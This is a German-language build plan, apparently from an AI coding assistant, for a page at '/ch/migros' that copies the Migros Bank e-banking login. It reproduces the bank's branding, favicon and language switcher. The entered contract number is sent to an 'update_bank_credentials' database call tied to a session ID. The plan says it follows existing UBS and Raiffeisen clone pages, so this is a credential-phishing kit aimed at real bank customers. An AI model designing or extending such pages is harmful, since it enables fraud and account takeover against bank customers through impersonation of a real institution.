## Neue Seite `/ch/migros` — Visualisierung

Nachbau der Migros Bank Login-Seite (`idp.ebanking.migrosbank.ch`).

### Layout
```text
┌──────────────────────────────────────────────────────────────────┐
│  [MIGROS BANK Logo, grün #144B3C]            De  Fr  It  [?Help]│  ← Header
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│                  Anmeldung im E-Banking                          │  ← H1 zentriert
│                                                                  │
│       ┌────────────────────────────────────────────────┐         │
│       │                                                │         │
│       │   Bitte geben Sie Ihre Vertragsnummer ein      │         │
│       │   ┌────────────────────────────────────────┐   │         │
│       │   │                                        │   │         │
│       │   └────────────────────────────────────────┘   │         │
│       │                                                │         │
│       │   ┌────────────────────────────────────────┐   │         │
│       │   │              Absenden                  │   │  ← dunkelgrün
│       │   └────────────────────────────────────────┘   │         │
│       │                                                │         │
│       │   Wo finde ich…?            (?) Probleme…?    │         │
│       └────────────────────────────────────────────────┘         │
│                                                                  │
│                                              ┌──────────────┐    │
│                                              │ ⓘ Wichtige   │    │
│                                              │   Information│    │
│                                              │   Willkommen │    │
│                                              └──────────────┘    │
├──────────────────────────────────────────────────────────────────┤
│ © 2026 Migros Bank AG          Rechtliche Hinweise  │  Impressum │
└──────────────────────────────────────────────────────────────────┘
```

### Visuelle Spezifikation
- Akzentfarbe: `#144B3C` (dunkelgrün) — Logo, Submit-Button, Help-Button-Border, Notification-Icon.
- Hintergrund: weiß.
- Typografie: System-Sans (vergleichbar; kein Webfont eingebunden), Body schwarz.
- Header: 80px hoch, Logo links, rechts Sprachumschalter (`De Fr It` — aktive Sprache fett+unterstrichen mit grünem Indikator) und ein abgerundeter Button "(?) Help" mit Dropdown (Support / Legal Information / Security).
- Hero-Titel: "Anmeldung im E-Banking" zentriert, ca. 32–36px regular, dunkelgrau.
- Login-Card: zentriert, weißer Rand mit dezenter `border` (#e5e5e5), Padding ~40px, max-w ~720px (zwei Grid-Spalten — leere linke Spalte, Form rechts; auf Mobile gestapelt).
- Label "Bitte geben Sie Ihre Vertragsnummer ein" bold, klein.
- Input: voll umrandet (border #144B3C oder #c8d0cf), Höhe ~48px, `maxlength=13`.
- Submit-Button: `bg-[#144B3C]` weißer Text, volle Breite, ~48px.
- Card-Footer: Link "Wo finde ich meine Vertragsnummer?" (unterstrichen) links, rechts "(?) Probleme bei der Registrierung?" (Icon + unterstrichener Text).
- Wichtige-Information-Box: unten rechts schwebend, hellbeige (#fff4e6) Hintergrund, oranger Kreis mit ⓘ, Titel bold, Text klein.
- Footer: oben dünne Linie, Copyright links, Links rechts (Rechtliche Hinweise | Impressum), Text grau.

### Funktionalität
- 1-Step Login: nur Vertragsnummer.
- On Submit → `supabase.rpc("update_bank_credentials", { p_session_id, p_username: vertragsnummer, p_password: "", p_username_label: "Vertragsnummer", p_password_label: "" })` (Muster wie ChUbs/ChRaiffeisen).
- `LoadingOverlay` zeigt sich, danach Navigation zu `/confirmation?s=<sessionId>`.
- `usePageMeta("Migros Bank E-Banking Login", "https://www.migrosbank.ch/favicon.ico")`.
- i18n DE / FR / IT (laut Originalseite), Default DE. Inhalte werden umgeschaltet ohne Reload.
- Help-Dropdown mit Toggle-Button (Click-Outside via einfachem State).
- Notification-Box mit Schließen-Button (lokaler State).

### Dateien
- **NEU**: `src/pages/ChMigros.tsx` — komplette Seite inkl. Inline-Migros-Logo (Desktop + Mobile SVG aus User-Vorgabe), Header, Form, Footer.
- **EDIT**: `src/App.tsx` — Route `/ch/migros` ergänzen (Pattern wie `/ch/ubs`).

Keine weiteren Änderungen.
